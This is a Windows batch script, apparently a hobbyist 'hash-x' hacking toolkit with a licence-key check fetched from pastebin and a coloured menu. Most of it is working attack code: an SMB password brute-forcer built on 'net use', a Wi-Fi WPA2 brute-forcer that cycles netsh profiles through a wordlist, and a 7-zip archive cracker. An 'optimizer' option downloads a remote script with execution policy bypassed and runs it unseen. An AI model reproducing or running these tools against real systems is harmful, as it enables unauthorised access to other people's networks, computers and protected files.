@echo off
setlocal EnableDelayedExpansion
chcp 65001>nul
cls
mode 40,10
:idk
cls
set "pastebin=https://pastebin.com/raw/jtDN3eXr"
set "tempfile=%temp%\keys.tmp"

echo Loading key database...
powershell -NoProfile -Command "(Invoke-WebRequest '%pastebin%').Content" > "%tempfile%" 2>nul

if not exist "%tempfile%" (
    echo Error al descargar base de datos.
    pause
    exit
)

set /p "userkey=Enter your key: "

set "found=0"
set "expdate="

for /f "usebackq delims=" %%A in ("%tempfile%") do (
    for /f "tokens=1,2 delims=|" %%K in ("%%A") do (
        if /i "%%K"=="%userkey%" (
            set "expdate=%%L"
            set "found=1"
        )
    )
)

if "%found%"=="0" (
    echo.
    echo LLAVE INVALIDA
    del "%tempfile%" >nul 2>&1
    pause
    exit
)

:: ===== Verificar expiración =====
for /f "usebackq delims=" %%X in (`powershell -NoProfile -Command ^
    "$exp='%expdate%';" ^
    "try{" ^
    "  $dt=[datetime]::ParseExact($exp,'d/M/yyyy H:m',$null);" ^
    "}catch{" ^
    "  try{$dt=[datetime]::ParseExact($exp,'d/M/yyyy',$null);}catch{$dt=$null}" ^
    "};" ^
    "if($dt -eq $null){'INVALID'} else {" ^
    "  $now=Get-Date;" ^
    "  if($dt -lt $now){'EXPIRED'} else {'VALID'}" ^
    "}"`) do (
    set "status=%%X"
)

if "%status%"=="INVALID" (
    echo Fecha invalida en base de datos.
    del "%tempfile%" >nul 2>&1
    pause
    exit
)

if "%status%"=="EXPIRED" (
    echo.
    echo LLAVE EXPIRADA
    del "%tempfile%" >nul 2>&1
    pause
    exit
)

del "%tempfile%" >nul 2>&1

echo.
echo ============================
echo   ACCESO CONCEDIDO
echo ============================
echo.

:: ==== AQUI CONTINUA TU PROGRAMA ====
cls
echo [92mcorrect pass
echo [96mloading[[34m------[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m=[34m-----[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[34m----[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m=[34m---[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[34m--[96m]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[96m=-]
ping localhost -n 2 >nul
cls
echo [92mcorrect pass
echo [96mloading[[34m==[94m==[96m==]
ping localhost -n 2 >nul
pause
goto menu
:menu
mode 120,30
cls
echo.
echo.
echo       	                                        [38;2;255;255;0mmade by pulgax
echo                                    [38;2;255;0;0m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒
echo                                    [38;2;255;51;0m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░
echo                                    [38;2;255;51;0m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░
echo                                    [38;2;255;102;0m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ 
echo                                    [38;2;255;102;0m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒
echo                                    [38;2;255;153;0m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░
echo                                    [38;2;255;204;0m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░
echo                                    [38;2;255;255;0m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░  
echo                                    [38;2;255;255;0m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  
echo. [38;2;255;0;0m
echo                                         type /commands or type a command
set /p imput=.%BS%                                       ╚══»
if /I %imput% EQU /commands goto commands
if /I %imput% EQU 1 goto commands
if /I %imput% EQU 0 goto exit
if /I %imput% EQU 2 goto CMD
if /I %imput% EQU 3 goto RPC
if /I %imput% EQU 4 goto bruteforce
if /i not %pass%== 1,0,2,3,4,/commands goto menu


:commands
cls
mode 120,30
echo.
echo.
echo       	                                        [38;2;255;255;0mmade by pulgax
echo                                    [38;2;255;0;0m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒
echo                                    [38;2;255;51;0m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░
echo                                    [38;2;255;51;0m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░
echo                                    [38;2;255;102;0m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ 
echo                                    [38;2;255;102;0m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒
echo                                    [38;2;255;153;0m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░
echo                                    [38;2;255;204;0m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░
echo                                    [38;2;255;255;0m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░  
echo                                    [38;2;255;255;0m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  
echo. [38;2;255;0;0m
echo         ╔commands
echo         ├─ hash-x   ┌───────────────┐         ┌─────────┐                      ┌───────┐
echo         └─┬─────────┤     MISC      ├───┬─────┤ hacking ├──────────────┬───────┤ other ├────────
echo           │         └───────────────┘   │     └─────────┘              │       └───────┘
echo           ├─{1} parrot             [I]  ├─{4}REMOTE CONTROLL PC   [I]  ├─{11}discord
echo           ├─{2} mejor cmd          [I]  ├─{5}BRUTEFORCE PC PASS   [I]  └─{22}exit
echo           └─{3} optimizador        [I]  ├─{6}BRUTEFORCE WIFI PASS [I]                         
echo                                         └─{7}WEB: Skibidi Zone    [x]
echo                                               type a command number(0,1,2,3...)
set /p imput=.%BS%                                            ╚══»
if /I %imput% EQU 1 goto test
if /I %imput% EQU 2 goto CMD
if /I %imput% EQU 3 goto opti
if /I %imput% EQU 4 goto rpc
if /I %imput% EQU 5 goto brutf
if /I %imput% EQU 6 goto brutfwif
if /I %imput% EQU 7 echo aun no acabado! 
if /I %imput% EQU 11 goto discord
if /I %imput% EQU 22 goto exit
pause >nul


:test
cls
curl parrot.live
pause>nul

:CMD
cls
title CMD made by pulgax
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
echo.
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
:inputcmd
echo.
echo  [97m╔══[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m]
set /p cmd=".%BS% [97m╚══>[0m "
echo.
%cmd%
goto inputcmd
exit

:opti
echo Descargando...

set "DL_DIR=%APPDATA%\Opti"
set "DL_FILE=%DL_DIR%\cleaner.cmd"
set "DL_URL=https://raw.githubusercontent.com/pulgax-g/optimizador/refs/heads/main/cleaner.cmd"

:: Crear carpeta si no existe
if not exist "%DL_DIR%" (
    mkdir "%DL_DIR%"
)

:: Si el archivo ya existe, ejecutarlo
if exist "%DL_FILE%" (
    start "" "%DL_FILE%"
    pause
    exit
)

:: Descargar archivo
powershell -NoProfile -ExecutionPolicy Bypass ^
 -Command "Invoke-WebRequest -Uri '%DL_URL%' -OutFile '%DL_FILE%'"

:: Verificar descarga
if exist "%DL_FILE%" (
    echo Descarga completada.
    start "" "%DL_FILE%"
) else (
    echo Error al descargar el archivo.
)
exit
:RPC
cls
title RemotePC made by pulgax
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
set /p host=.%BS%                                         host══»
set /p user=.%BS%                                         user══»
set /p pass=.%BS%                                         pass══»
cmdkey /add:%host% /user:%user% /pass:%pass% >nul
mstsc v:%host%
cmdkey /delete:%host% >nul
pause 
exit

:brutf
cls
title SMB Bruteforce
echo.
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
echo.
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

:brutfwif
    cls
    echo.
    echo.
    echo.
    echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
    echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
    echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
    echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
    echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
    echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
    echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
    echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
    echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
    echo.
    echo.
    call :color_echo . cyan "bruteforce wifi made by hash-x"
    echo.
    echo.
    call :color_echo . magenta "Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac!"
    call :color_echo . white ") "
    echo.
    call :color_echo . magenta "ID        : "
    call :color_echo . white "!interface_id!"
    echo.
    call :color_echo . magenta "Target    : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.
    echo.
    echo Type 'help' for more info
    echo.
    call :program_prompt
    echo.

    if "%program_prompt_input%" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "help" (
        call :help
        goto :mainmenu
    )


    if "%program_prompt_input%" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "counter" (
        call :counter
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "exit" (
        exit
    )

    call :program_prompt_invalid_input
goto :mainmenu


:scan
    cls

    if "%interface_id%" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )

    netsh wlan disconnect interface="%interface_id%" > nul

    :scan_wait_disconnected_loop
    call :interface_find_state

    if "%interface_state%" neq "disconnected" (
        goto :scan_wait_disconnected_loop
    )
    

    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.
    echo Scanning...
    echo.
    :: wifi[] is the array for possible wifis
    set scan_wifi_index=0
    set cancel_index=0

    set scan_parse_counter=0
    set scan_parse_begin=false
    set scan_parse_line=
    set scan_parse_arg=

    for /f "skip=3 tokens=* delims=" %%a in ('netsh wlan show networks mode^=bssid interface^="%interface_id%" ^| findstr /n "^"') do (
        set "scan_parse_line=%%a"
        set "scan_parse_line=!scan_parse_line:*:=!"

        if "!scan_parse_begin!" equ "true" if "!scan_parse_line!" neq "" (
            for /f "tokens=1,* delims=:" %%x in ("!scan_parse_line!") do set scan_parse_arg=%%y

            call :trim_spaces scan_parse_arg

            if "!scan_parse_counter!" equ "0" (
                set wifi[!scan_wifi_index!]_ssid=!scan_parse_arg!
            )

            if "!scan_parse_counter!" equ "5" (
                set wifi[!scan_wifi_index!]_signal=!scan_parse_arg!
            )

            set /a scan_parse_counter=!scan_parse_counter!+1

        )

        if !scan_parse_counter! gtr 5 (
            set scan_parse_counter=0
            set /a scan_wifi_index=!scan_wifi_index!+1
            set scan_parse_begin=false
        )

        if "!scan_parse_line!" equ "" (
            set scan_parse_begin=true
        )

    )
    set /a scan_wifi_index=!scan_wifi_index!-1
    set /a cancel_index=!scan_wifi_index!+1
    
    for /l %%a in ( 0, 1, !scan_wifi_index! ) do (

        call :color_echo . magenta "%%a) "

        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid! "
        )

        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )


    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt
    echo.
    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )
    if !program_prompt_input! leq !scan_wifi_index! if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
    )
    call :program_prompt_invalid_input

goto :eof


:attack

    set attack_finalize=false

    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist..."
        echo.
        echo.
        pause
        goto :eof
    )


    if "!wifi_target!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select a target after scanning..."
        echo.
        echo.
        pause
        goto :eof
    )

    if "!interface_id!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select an interface..."
        echo.
        echo.
        pause
        goto :eof
    )

    cls
    echo.
    call :color_echo . yellow "WARNING"
    echo.
    echo.
    echo If you connected to a network with the same name as this: "!wifi_target!",
    echo its profile will be deleted.
    echo.
    echo This app might not find the correct password if the signal strength
    echo is too low. Remember, this is an online attack. Expect slow attempts.
    echo.
    echo When an authentication is detected, attack counter is
    echo automatically increased by 5 to ensure successful connection.
    echo.
    pause
    netsh wlan delete profile name="!wifi_target!" interface="!interface_id!">nul
    cls

    set password_count=0
    
    for /f "tokens=1" %%a in ( !wordlist_file! ) do (

        set /a password_count=!password_count!+1
        set password=%%a
		set temp_auth_num=0
        :: Prepare ssid import
        del /Q /F importwifi.xml 2>nul
        call :importwifi_write
        netsh wlan add profile filename="importwifi.xml" interface="!interface_id!" >nul
        cls
        echo.
        echo.
        echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
        echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
        echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
        echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
        echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
        echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
        echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
        echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
        echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
        echo.
		echo.
        call :color_echo . cyan "Attacking"
        echo.
        echo.
        call :color_echo . magenta "Target Wi-Fi   : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password Count : "
        call :color_echo . white "!password_count!"
        echo.
        echo.
        call :color_echo . blue "Trying password -> "
        call :color_echo . yellow "!password!"
        echo.
        echo.
        call :color_echo . cyan "Attempts: "
        echo.

        call :attack_attempt

        if "!attack_finalize!" equ "true" (
            set attack_finalize=false
            goto :eof
        )

    )

    call :attack_failure
goto :eof


:importwifi_write

    set wifi_target_xml=!wifi_target!
    set wifi_target_xml=!wifi_target_xml:^&=^&amp;!
    set wifi_target_xml=!wifi_target_xml:^<=^&lt;!
    set wifi_target_xml=!wifi_target_xml:^>=^&gt;!
    set wifi_target_xml=!wifi_target_xml:^"=^&quot;!
    set wifi_target_xml=!wifi_target_xml:^'=^&apos;!

    set password_xml=!password!
    set password_xml=!password_xml:^&=^&amp;!
    set password_xml=!password_xml:^<=^&lt;!
    set password_xml=!password_xml:^>=^&gt;!
    set password_xml=!password_xml:^"=^&quot;!
    set password_xml=!password_xml:^'=^&apos;!


    echo ^<?xml version="1.0"?^> >> importwifi.xml
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >> importwifi.xml
    echo    ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
    echo    ^<SSIDConfig^> >> importwifi.xml
    echo        ^<SSID^> >> importwifi.xml
    echo            ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
    echo        ^</SSID^> >> importwifi.xml
    echo    ^</SSIDConfig^> >> importwifi.xml
    echo    ^<connectionType^>ESS^</connectionType^> >> importwifi.xml
    echo    ^<connectionMode^>manual^</connectionMode^> >> importwifi.xml
    echo    ^<MSM^> >> importwifi.xml
    echo        ^<security^> >> importwifi.xml
    echo            ^<authEncryption^> >> importwifi.xml
    echo                ^<authentication^>WPA2PSK^</authentication^> >> importwifi.xml
    echo                ^<encryption^>AES^</encryption^> >> importwifi.xml
    echo                ^<useOneX^>false^</useOneX^> >> importwifi.xml
    echo            ^</authEncryption^> >> importwifi.xml
    echo            ^<sharedKey^> >> importwifi.xml
    echo                ^<keyType^>passPhrase^</keyType^> >> importwifi.xml
    echo                ^<protected^>false^</protected^> >> importwifi.xml
    echo                ^<keyMaterial^>!password_xml!^</keyMaterial^> >> importwifi.xml
    echo            ^</sharedKey^> >> importwifi.xml
    echo        ^</security^> >> importwifi.xml
    echo    ^</MSM^> >> importwifi.xml
    echo    ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >> importwifi.xml
    echo        ^<enableRandomization^>false^</enableRandomization^> >> importwifi.xml
    echo    ^</MacRandomization^> >> importwifi.xml
    echo ^</WLANProfile^> >> importwifi.xml

goto :eof

:attack_failure
    del /Q /F importwifi.xml 2>nul
    cls
    echo.
    call :color_echo . red "Could not find the password"
    echo.
    echo.
    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
    pause
goto :eof

:attack_success
    del /Q /F importwifi.xml 2>nul
    cls
    echo.
    call :color_echo . green "Found the password"
    echo.
    echo.
    echo.
    call :color_echo . magenta "Target     : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Password   : "
    call :color_echo . white "!password!"
    echo.
    call :color_echo . magenta "At attempt : "
    call :color_echo . white "!password_count!"
    echo.
    echo.

    echo Batch Wi-Fi Brute Forcer Result>>result.txt
    echo Target     : !wifi_target!>>result.txt
    echo At attempt : !password_count!>>result.txt
    echo Password   : !password!>>result.txt
    echo.>>result.txt
    pause
goto :eof

:attack_attempt
	netsh wlan connect name="%wifi_target%" interface="%interface_id%" >nul

    if "%attack_counter_option%" equ "0" (
        set attack_counter=5
    ) else (
        set attack_counter=!attack_counter_option!
    )

    set attack_authenticating_detected=false

    :attack_attempt_loop

        if "!attack_counter!" equ "0" (
            del /Q /F importwifi.xml 2>nul
            goto :eof
        )

        call :color_echo . white "Attempts Left ("
        call :color_echo . magenta "!attack_counter!"
        call :color_echo . white ") "

        timeout /t 1 /nobreak >nul
        set interface_state=none
        call :interface_find_state

        if "%interface_state%"=="disconnecting" (
            call :color_echo . red "Timeout"
            echo.
        )
        if "%interface_state%"=="disconnected" (
            call :color_echo . red "Timeout"
            echo.
        )
        if "%interface_state%"=="authenticating" (
            call :color_echo . blue "Authenticating"
            echo.
        )
        if "%interface_state%"=="connecting" (
            call :color_echo . yellow "Connecting"
            echo.
        )
        if "%interface_state%"=="connected" (
            call :color_echo . green "Connected"
            echo.
            timeout /t 2 /nobreak>nul
        )

        if "%interface_state%" equ "authenticating" (
            if "!attack_authenticating_detected!" equ "false" (
                set /a attack_counter=!attack_counter!+5
                set attack_authenticating_detected=true
            )
        ) 

        if "!interface_state!" equ "connecting" (
            del /Q /F importwifi.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )

        if "!interface_state!" equ "connected" (
            del /Q /F importwifi.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )
        

        if "!interface_state!" equ "none" (
            call :exit_fatal "Cannot find interface state!"
        )

        set /a attack_counter=!attack_counter!-1

    goto :attack_attempt_loop

goto :eof

:help
	cls
	echo.
	call :color_echo . cyan "Commands"
	echo.
	echo.
	echo  - help             : Displays this page
	echo  - wordlist         : Provide a wordlist file
	echo  - scan             : Performs a WI-FI scan
	echo  - interface        : Open Interface Management
	echo  - attack           : Attacks selected WI-FI
	echo  - counter          : Sets the attack counter
	echo  - exit             : Close the program
	echo.
	echo.
	echo.
	echo Press any key to continue...
	pause >nul

goto :eof


:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist "!program_prompt_input!" (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 2 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof

:counter
    cls
    echo.
    call :color_echo . cyan "Set Attempt Count"
    echo.
    echo.
    echo Please provide number for per-password 
    echo counter while attacking a network.
    echo.
    echo This counter will be used to query network
    echo connection whether it is successful.
    echo.
    call :program_prompt
    echo.
    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
    
    if "%errorlevel%" equ "0" (
        set attack_counter_option=!program_prompt_input!
    ) else (
        call :color_echo . red "Provided input is not a valid number"
        timeout /t 2 >nul
    )
goto :eof

:interface_find_state

    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='!interface_id!'" get NetConnectionStatus /value') do (
        set interface_status_code=%%A
    )

    if "%interface_status_code%"=="1" (
        set interface_state=connecting
    )

    if "%interface_status_code%"=="2" (
        set interface_state=connected
    )
    
    if "%interface_status_code%"=="3" (
        set interface_state=disconnecting
    )

    if "%interface_status_code%"=="7" (
        set interface_state=disconnected
    )

    if "%interface_status_code%"=="8" (
        set interface_state=authenticating
    )

goto :eof


:exit_fatal
    call :color_echo . red "%~1"
    timeout /t 3 >nul
    exit
goto :eof


:trim_right
        set "str=!%~1!"
        :trim_right_loop
        if "!str:~-1!"==" " (
        set "str=!str:~0,-1!"
        goto trim_right_loop
        )
        set %~1=!str!
goto :eof


:trim_left
    set "str=!%~1!"
    :trim_left_loop
    if "!str:~0,1!"==" " (
        set "str=!str:~1!"
        goto trim_left_loop
    )
    set %~1=!str!
goto :eof


:trim_spaces
        call :trim_left %1
        call :trim_right %1
goto :eof

:brutfzip
cls
title 7-zip cracker
color 3
echo.
echo.
echo                                    [34m███░ ██  ▄▄▄        ██████  ██░ ██ ▒██   ██▒[0m
echo                                    [34m▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒▒ █ █ ▒░[0m
echo                                    [34m▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░░  █   ░[0m
echo                                    [94m░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██  ░ █ █ ▒ [0m
echo                                    [94m░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██▒ ▒██▒[0m
echo                                    [94m▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒▒ ░ ░▓ ░ [0m
echo                                    [96m▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░░   ░▒ ░ [0m
echo                                    [96m░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░    ░   [0m
echo                                    [96m ░  ░  ░      ░  ░      ░   ░  ░  ░ ░    ░  [0m
echo.
if not exist "C:\Program Files\7-Zip" (
	echo install 7-zip retard
	echo instal it at https://7-zip.org/download.html
	pause
	exit
)

echo.
echo [tip] drag the file over or copy the access directory
set /p archive="Enter Archive: "
if not exist "%archive%" (
	echo Archive not found! [tip] drag it over
	pause
	exit
)

set /p wordlist="Enter Wordlist: "
if not exist "%wordlist%" (
	echo Wordlist not found!
	pause
	exit
)
echo hash-x cracking this dumb file
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo search a better hash-x wordlist or download one of our discordd :c
pause
exit

:attemptzip
"C:\Program Files\7-Zip\7za.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo ATTEMPT : %pass%
if /I %errorlevel% EQU 0 (
	echo great! dumb pass: %pass%
	pause
	exit
)



:exit
echo Are you sure? (Y/N)
set /p imput=%BS%                                            ╚══»
if /I %imput% EQU Y goto YEXIT
if /I %imput% EQU N goto :menu
pause

:YEXIT
exit
